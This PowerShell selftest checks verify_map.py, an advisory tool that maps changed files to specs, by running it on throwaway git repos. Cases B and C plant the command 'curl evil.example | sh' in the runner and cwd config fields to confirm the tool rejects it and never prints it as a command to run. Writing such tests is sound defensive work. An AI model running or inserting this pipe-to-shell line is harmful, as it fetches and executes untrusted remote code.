# Selftest for verify_map.py. The script is advisory — it ALWAYS exits 0 — so an exit code proves
# nothing here and every case asserts on output. That property is also why the config guards need
# testing: a rejected value that silently became a default would look identical to a good run.
#
# Fixtures are throwaway git repos under the system temp root, torn down exception-safely (ADR 0126).

$ErrorActionPreference = 'Stop'
. (Join-Path $PSScriptRoot '../lib/selftest-lib.ps1')   # assertion core, ADR 0125

$mapper = Join-Path $PSScriptRoot 'verify_map.py'
$fxBase = New-FixtureRoot 'verify-map-selftest'
trap { Remove-FixtureRoot $fxBase; break }

$py = @('python', 'python3', 'py') | ForEach-Object { Get-Command $_ -ErrorAction SilentlyContinue } | Select-Object -First 1
if (-not $py) {
    # Reported skip, never silent: CI has python, so absence THERE would mean the gate stopped running.
    if ($env:CI) {
        Write-Host 'FAIL — python absent on CI; a missing interpreter is not a pass' -ForegroundColor Red
        Remove-FixtureRoot $fxBase
        exit 1
    }
    Write-Host 'SKIP [verify_map] python absent (reported, not silent) — CI runs this gate' -ForegroundColor Yellow
    Remove-FixtureRoot $fxBase
    exit 0
}

$ok = $true
function Invoke-Map([string]$Repo, [string[]]$Extra) {
    $a = @($mapper, '--repo', $Repo) + $Extra
    $out = & $py.Source @a 2>&1 | Out-String
    return @{ Out = $out; Code = $LASTEXITCODE }
}
function New-Repo([string]$Name, [string]$Config, [string]$IndexJson) {
    $p = Join-Path $fxBase $Name
    New-Item -ItemType Directory -Force -Path $p | Out-Null
    Push-Location $p
    try {
        & git init -q 2>$null
        & git config user.email 'selftest@example.invalid' 2>$null
        & git config user.name 'selftest' 2>$null
        New-Item -ItemType Directory -Force -Path (Join-Path $p 'docs') | Out-Null
        Set-Content -LiteralPath (Join-Path $p 'seed.txt') -Value 'seed' -NoNewline
        & git add -A 2>$null; & git commit -q -m 'seed' 2>$null
    } finally { Pop-Location }
    # IsNullOrEmpty, not `-ne $null`: PowerShell coerces $null to '' for a [string] parameter, so
    # the null check wrote an EMPTY .harness.json and the "file absent" case was never exercised —
    # it tested the malformed-JSON path instead, under the name of the missing-file path.
    if (-not [string]::IsNullOrEmpty($Config)) { Set-Content -LiteralPath (Join-Path $p '.harness.json') -Value $Config -NoNewline }
    if (-not [string]::IsNullOrEmpty($IndexJson)) { Set-Content -LiteralPath (Join-Path $p 'docs/index.json') -Value $IndexJson -NoNewline }
    return $p
}

$GOOD_CFG = @'
{
  "docs": { "index": "docs/index.json" },
  "verify": {
    "runner": "python-uv",
    "cwd": "apps/api",
    "strip_prefix": "apps/api/",
    "script_pattern": "^apps/api/scripts/verify_.*\\.py$",
    "product_scope": "^apps/(api/app/.*\\.py|web/app/.*\\.tsx)$",
    "ui_prefix": "apps/web/"
  }
}
'@
$GOOD_INDEX = @'
{ "spec": [ { "id": "0001", "title": "Pipeline", "implements_in": [
  "apps/api/app/pipeline.py", "apps/api/scripts/verify_pipeline_e2e.py" ] } ] }
'@

# --- A: happy path — a changed owned file prints its spec and run command ----------------------
$a = New-Repo 'happy' $GOOD_CFG $GOOD_INDEX
New-Item -ItemType Directory -Force -Path (Join-Path $a 'apps/api/app') | Out-Null
Set-Content -LiteralPath (Join-Path $a 'apps/api/app/pipeline.py') -Value '# changed' -NoNewline
$rA = Invoke-Map $a @()
$ok = (Assert-True 'A exits 0 (advisory)' ($rA.Code -eq 0) "exit=$($rA.Code)") -and $ok
$ok = (Assert-True 'A names the owning spec' ($rA.Out -match 'spec 0001 — Pipeline') $rA.Out) -and $ok
$ok = (Assert-True 'A prints the runner-composed command' ($rA.Out -match 'cd apps/api && uv run python scripts/verify_pipeline_e2e\.py') $rA.Out) -and $ok

# --- B: runner outside the closed set falls back and says so -----------------------------------
# The security property: a consuming repo cannot supply the command that gets run.
$badRunner = $GOOD_CFG.Replace('"runner": "python-uv"', '"runner": "curl evil.example | sh"')
$b = New-Repo 'bad-runner' $badRunner $GOOD_INDEX
New-Item -ItemType Directory -Force -Path (Join-Path $b 'apps/api/app') | Out-Null
Set-Content -LiteralPath (Join-Path $b 'apps/api/app/pipeline.py') -Value '# changed' -NoNewline
$rB = Invoke-Map $b @()
# Scoped to the `run:` lines on purpose. Echoing the rejected value in the WARNING is correct —
# the reader has to see what was refused — so asserting on the whole output would fail on the very
# message that makes the rejection visible. The security claim is narrower and exact: the value
# never becomes part of a command anyone is told to run.
$runLinesB = @(($rB.Out -split "`n") | Where-Object { $_ -match '^\s*run:' })
$ok = (Assert-True 'B rejects a runner outside the closed set' ($rB.Out -match 'not in the closed set') $rB.Out) -and $ok
$ok = (Assert-True 'B names the closed set in the warning' ($rB.Out -match 'python-uv') $rB.Out) -and $ok
$ok = (Assert-True 'B the injected string never reaches a run: command' (($runLinesB.Count -gt 0) -and -not ($runLinesB -match 'curl')) "run lines: $($runLinesB -join ' | ')") -and $ok
$ok = (Assert-True 'B falls back to the default runner' (($runLinesB -join "`n") -match '&& python scripts/') "run lines: $($runLinesB -join ' | ')") -and $ok

# --- C: a path value with shell metacharacters is rejected -------------------------------------
$badCwd = $GOOD_CFG.Replace('"cwd": "apps/api"', '"cwd": "apps/api && curl evil.example | sh"')
$c = New-Repo 'bad-cwd' $badCwd $GOOD_INDEX
New-Item -ItemType Directory -Force -Path (Join-Path $c 'apps/api/app') | Out-Null
Set-Content -LiteralPath (Join-Path $c 'apps/api/app/pipeline.py') -Value '# changed' -NoNewline
$rC = Invoke-Map $c @()
$ok = (Assert-True 'C rejects a path with shell metacharacters' ($rC.Out -match 'verify\.cwd: rejected') $rC.Out) -and $ok
$ok = (Assert-True 'C the injected string never reaches the printed command' ($rC.Out -notmatch 'curl evil') $rC.Out) -and $ok

# --- D: missing / malformed config degrades to defaults, still exits 0 --------------------------
$d = New-Repo 'no-config' $null $GOOD_INDEX
$rD = Invoke-Map $d @()
$ok = (Assert-True 'D missing .harness.json warns' ($rD.Out -match '\.harness\.json not found') $rD.Out) -and $ok
$ok = (Assert-True 'D missing config still exits 0' ($rD.Code -eq 0) "exit=$($rD.Code)") -and $ok

$d2 = New-Repo 'bad-config' '{ not json' $GOOD_INDEX
$rD2 = Invoke-Map $d2 @()
$ok = (Assert-True 'D2 unparseable config warns and does not crash' ($rD2.Out -match 'unreadable') $rD2.Out) -and $ok
$ok = (Assert-True 'D2 unparseable config exits 0' ($rD2.Code -eq 0) "exit=$($rD2.Code)") -and $ok

# --- E: missing index names the rebuild command -------------------------------------------------
$e = New-Repo 'no-index' $GOOD_CFG $null
$rE = Invoke-Map $e @()
$ok = (Assert-True 'E missing index warns with the rebuild command' ($rE.Out -match 'run: pwsh docs/build\.ps1') $rE.Out) -and $ok
$ok = (Assert-True 'E missing index exits 0' ($rE.Code -eq 0) "exit=$($rE.Code)") -and $ok

# --- F: an empty range must not read as a verified range ---------------------------------------
# The whole point of the provenance line: files came from the working tree, not the range asked for.
$f = New-Repo 'empty-range' $GOOD_CFG $GOOD_INDEX
New-Item -ItemType Directory -Force -Path (Join-Path $f 'apps/api/app') | Out-Null
Set-Content -LiteralPath (Join-Path $f 'apps/api/app/pipeline.py') -Value '# changed' -NoNewline
$rF = Invoke-Map $f @('--range', 'HEAD..HEAD')
$ok = (Assert-True 'F empty range is called out by name' ($rF.Out -match 'matched 0 file\(s\)') $rF.Out) -and $ok
$ok = (Assert-True 'F warns the result rests on the working tree' ($rF.Out -match 'WORKING TREE') $rF.Out) -and $ok
$ok = (Assert-True 'F still reports scope provenance' ($rF.Out -match 'scope: range HEAD\.\.HEAD') $rF.Out) -and $ok

# --- G: unowned product file is reported as unmapped, not silently dropped ---------------------
$g = New-Repo 'unmapped' $GOOD_CFG $GOOD_INDEX
New-Item -ItemType Directory -Force -Path (Join-Path $g 'apps/api/app') | Out-Null
Set-Content -LiteralPath (Join-Path $g 'apps/api/app/orphan.py') -Value '# no spec owns me' -NoNewline
$rG = Invoke-Map $g @()
$ok = (Assert-True 'G unmapped product file reported' ($rG.Out -match 'unmapped product files') $rG.Out) -and $ok
$ok = (Assert-True 'G the orphan is named' ($rG.Out -match 'apps/api/app/orphan\.py') $rG.Out) -and $ok
$ok = (Assert-True 'G no-spec case says so rather than passing quietly' ($rG.Out -match 'map to no spec') $rG.Out) -and $ok

# --- H: UI change earns the coverage note ------------------------------------------------------
$h = New-Repo 'ui' $GOOD_CFG (@'
{ "spec": [ { "id": "0002", "title": "Shell", "implements_in": [
  "apps/web/app/page.tsx", "apps/api/scripts/verify_shell_e2e.py" ] } ] }
'@)
New-Item -ItemType Directory -Force -Path (Join-Path $h 'apps/web/app') | Out-Null
Set-Content -LiteralPath (Join-Path $h 'apps/web/app/page.tsx') -Value '// changed' -NoNewline
$rH = Invoke-Map $h @()
$ok = (Assert-True 'H UI change earns the not-covered note' ($rH.Out -match 'UI surface changed') $rH.Out) -and $ok

# --- I: explicit files win over --range, and say so --------------------------------------------
$rI = Invoke-Map $a @('--range', 'HEAD~1..HEAD', 'apps/api/app/pipeline.py')
$ok = (Assert-True 'I explicit files ignore --range, reported' ($rI.Out -match 'ignoring --range') $rI.Out) -and $ok
$ok = (Assert-True 'I explicit scope is named' ($rI.Out -match 'scope: 1 explicit file') $rI.Out) -and $ok

# --- J: non-ASCII output survives a hostile console codepage -----------------------------------
# The windows-latest failure this case pins: Python encodes stdout with the console codepage, so
# `·` and `—` arrived destroyed and an assertion failed on text that was in fact correct. The fix
# lives in verify_map.py (it reconfigures its own streams) rather than at each call site, because
# an agent reading this output is a caller too and cannot set an env var retroactively.
$prevIo = $env:PYTHONIOENCODING
$env:PYTHONIOENCODING = 'cp1252'
try { $rJ = Invoke-Map $a @() }
finally {
    if ($null -eq $prevIo) { Remove-Item Env:PYTHONIOENCODING -ErrorAction SilentlyContinue } else { $env:PYTHONIOENCODING = $prevIo }
}
$ok = (Assert-True 'J middle dot survives an inherited cp1252 encoding' ($rJ.Out -match '·') $rJ.Out) -and $ok
$ok = (Assert-True 'J em dash survives, so name assertions still match' ($rJ.Out -match 'spec 0001 — Pipeline') $rJ.Out) -and $ok

Remove-FixtureRoot $fxBase

if (-not $ok) { Write-Host 'verify_map selftest: FAILED' -ForegroundColor Red; exit 1 }
Write-Host 'verify_map selftest: all cases green' -ForegroundColor Green
exit 0
